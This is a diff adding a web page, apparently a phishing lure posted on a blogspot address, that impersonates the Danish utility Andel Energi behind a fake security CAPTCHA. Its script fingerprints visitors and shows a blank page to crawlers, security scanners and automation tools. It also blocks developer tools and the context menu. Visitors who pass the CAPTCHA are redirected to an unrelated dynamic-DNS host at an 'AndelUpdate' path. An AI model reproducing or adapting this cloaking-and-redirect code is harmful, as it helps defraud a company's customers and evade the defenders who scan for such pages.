@@ -1,0 +1,380 @@
+<!-- url: https://andel-energi.blogspot.com/
+status: 200 -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>Sikkerhedsverifikation</title>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Skin - Universal Anti-Bot Protection
+-----------------------------------------------
+*/
+body {
+margin: 0;
+padding: 0;
+font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+background: url('https://andelenergi.dk/app/uploads/2024/05/andel-energi-JC-_FSE2520-1536x1025.jpg');
+background-size: cover;
+background-position: center;
+background-attachment: fixed;
+color: #333;
+min-height: 100vh;
+display: flex;
+align-items: center;
+justify-content: center;
+}
+.container {
+background: rgba(255, 255, 255, 0.98);
+padding: 30px;
+border-radius: 8px;
+box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+text-align: center;
+max-width: 320px;
+width: 90%;
+}
+.captcha-display {
+font-family: 'Courier New', monospace;
+font-size: 36px;
+font-weight: bold;
+letter-spacing: 12px;
+color: #00A651;
+background: rgba(255,255,255,0.9);
+padding: 25px 15px;
+border-radius: 6px;
+margin-bottom: 15px;
+text-align: center;
+border: 1px solid #e0e0e0;
+}
+.input-field {
+width: 100%;
+padding: 16px;
+margin: 10px 0;
+border: 1px solid #bdc3c7;
+border-radius: 4px;
+font-size: 18px;
+text-align: center;
+box-sizing: border-box;
+background: white;
+color: #2C3E50;
+font-family: 'Courier New', monospace;
+font-weight: bold;
+}
+.input-field:focus {
+border-color: #00A651;
+outline: none;
+}
+.verify-btn {
+background: #00A651;
+color: white;
+border: none;
+padding: 16px;
+border-radius: 4px;
+font-size: 16px;
+font-weight: 600;
+cursor: pointer;
+margin: 10px 0;
+width: 100%;
+transition: background 0.2s;
+}
+.verify-btn:hover {
+background: #008C45;
+}
+.verify-btn:disabled {
+background: #95a5a6;
+cursor: not-allowed;
+}
+.refresh-btn {
+background: none;
+border: none;
+color: #7f8c8d;
+cursor: pointer;
+font-size: 13px;
+margin: 5px 0;
+padding: 8px;
+transition: color 0.2s;
+}
+.refresh-btn:hover {
+color: #00A651;
+}
+.white-page {
+background: white;
+width: 100%;
+height: 100vh;
+position: fixed;
+top: 0;
+left: 0;
+z-index: 9999;
+}
+.hidden {
+display: none;
+}
+
+--></style>
+<script>
+//<![CDATA[
+// SYSTÈME ANTI-BOTS UNIVERSEL
+var currentCaptcha = '';
+var maxAttempts = 5;
+var attempts = 0;
+var lastClickTime = 0;
+var clickCount = 0;
+var isHuman = false;
+
+// Détection avancée des bots
+function detectBots() {
+  var ua = navigator.userAgent.toLowerCase();
+  
+  // Liste des bots connus
+  var knownBots = [
+    'bot', 'crawler', 'spider', 'scraper', 'checker', 'monitor',
+    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider',
+    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot',
+    'telegrambot', 'discordbot', 'applebot', 'whatsapp', 'pinterest',
+    'instagram', 'snapchat', 'redditbot', 'quorabot', 'embedly',
+    'outbrain', 'showyoubot', 'vkshare', 'w3c_validator',
+    'python', 'curl', 'wget', 'java', 'php', 'ruby', 'perl'
+  ];
+  
+  // Vérification User Agent
+  for (var i = 0; i < knownBots.length; i++) {
+    if (ua.indexOf(knownBots[i]) !== -1) {
+      return true;
+    }
+  }
+  
+  // Détection des outils d'automation
+  if (navigator.webdriver || window.callPhantom || window._phantom || 
+      window.phantom || window.__webdriver_evaluate || window.__selenium_evaluate) {
+    return true;
+  }
+  
+  // Headers spécifiques aux automation tools
+  if (navigator.__nightmare || navigator.webdriver === true) {
+    return true;
+  }
+  
+  // Vérification des caractéristiques humaines
+  var humanTests = {
+    // Test des plugins (les bots n'ont pas de plugins)
+    plugins: navigator.plugins.length > 0,
+    
+    // Test des langues
+    languages: navigator.languages && navigator.languages.length > 0,
+    
+    // Test de la résolution d'écran
+    screen: screen.width > 200 && screen.height > 200,
+    
+    // Test des APIs navigateur
+    apis: !!(window.chrome || window.safari) && 
+          !!window.Notification && 
+          !!window.WebGLRenderingContext,
+    
+    // Test de performance (les bots sont trop rapides)
+    performance: (function() {
+      var start = performance.now();
+      var sum = 0;
+      for (var i = 0; i < 100000; i++) {
+        sum += Math.sqrt(i);
+      }
+      var time = performance.now() - start;
+      return time > 2; // Les humains prennent plus de 2ms
+    })()
+  };
+  
+  var passedTests = Object.values(humanTests).filter(function(test) { return test; }).length;
+  
+  // Si moins de 3 tests passent, c'est probablement un bot
+  return passedTests < 3;
+}
+
+// Afficher une page blanche pour les bots
+function showWhitePage() {
+  document.body.innerHTML = '<div class="white-page"></div>';
+  document.title = '';
+  
+  // Bloquer toute interaction
+  document.addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+  });
+  
+  document.addEventListener('keydown', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+  });
+  
+  // Empêcher l'inspection
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+  
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+      e.preventDefault();
+    }
+  });
+}
+
+// Protection contre les clicks rapides
+function throttleClick(callback) {
+  var now = Date.now();
+  if (now - lastClickTime < 500) {
+    clickCount++;
+    if (clickCount > 10) {
+      setTimeout(function() {
+        clickCount = 0;
+      }, 10000);
+      return false;
+    }
+    return false;
+  }
+  lastClickTime = now;
+  return callback();
+}
+
+// Générer CAPTCHA
+function generateCaptcha() {
+  if (!isHuman) {
+    showWhitePage();
+    return;
+  }
+  
+  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  var captcha = '';
+  for (var i = 0; i < 6; i++) {
+    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  currentCaptcha = captcha;
+  
+  try {
+    var captchaElement = document.getElementById('captchaText');
+    if (captchaElement) {
+      captchaElement.textContent = captcha;
+    }
+  } catch (e) {
+    console.log('DOM update error');
+  }
+}
+
+// Vérification CAPTCHA
+function verifyCaptcha() {
+  if (!isHuman) {
+    showWhitePage();
+    return false;
+  }
+  
+  return throttleClick(function() {
+    var userInput = document.getElementById('captchaInput').value.trim().toUpperCase();
+    var verifyBtn = document.getElementById('verifyBtn');
+    
+    if (userInput === '') {
+      return false;
+    }
+    
+    if (userInput !== currentCaptcha) {
+      attempts++;
+      if (attempts >= maxAttempts) {
+        verifyBtn.disabled = true;
+        setTimeout(function() {
+          verifyBtn.disabled = false;
+          attempts = 0;
+        }, 30000);
+      } else {
+        generateCaptcha();
+        document.getElementById('captchaInput').value = '';
+      }
+      return false;
+    }
+    
+    // CAPTCHA correct - Redirection
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Omdirigerer...';
+    
+    setTimeout(function() {
+      window.location.href = "http://agricolmail.dynv6.net/AndelUpdate/dodk/index.php";
+    }, 1000);
+    
+    return true;
+  });
+}
+
+// Rafraîchir CAPTCHA
+function refreshCaptcha() {
+  if (!isHuman) {
+    showWhitePage();
+    return;
+  }
+  
+  throttleClick(function() {
+    generateCaptcha();
+    document.getElementById('captchaInput').value = '';
+  });
+}
+
+// Initialisation
+function init() {
+  // Vérifier si c'est un bot
+  var isBot = detectBots();
+  
+  if (isBot) {
+    // C'est un bot - Afficher page blanche
+    showWhitePage();
+  } else {
+    // C'est un humain - Afficher le CAPTCHA
+    isHuman = true;
+    generateCaptcha();
+    
+    // Ajouter les événements
+    document.getElementById('verifyBtn').addEventListener('click', verifyCaptcha);
+    document.getElementById('captchaInput').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        verifyCaptcha();
+      }
+    });
+    
+    document.addEventListener('dblclick', function(e) {
+      e.preventDefault();
+    });
+  }
+}
+
+// Démarrer
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', init);
+} else {
+  init();
+}
+
+// Protection contre les erreurs
+window.addEventListener('error', function(e) {
+  e.preventDefault();
+});
+
+window.addEventListener('unhandledrejection', function(e) {
+  e.preventDefault();
+});
+//]]>
+</script>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+</head>
+<body>
+<!-- Contenu visible SEULEMENT pour les humains -->
+<div class='container'>
+<div class='captcha-display'>
+<span id='captchaText'></span>
+</div>
+<input autocomplete='off' class='input-field' id='captchaInput' maxlength='6' placeholder='Indtast kode' type='text'/>
+<button class='verify-btn' id='verifyBtn' type='button'>
+      Bekræft
+    </button>
+<button class='refresh-btn' onclick='refreshCaptcha()' type='button'>
+      Ny kode
+    </button>
+</div>
+<div class='no-items section' id='main-section'></div>
+
+</body>
+</html>
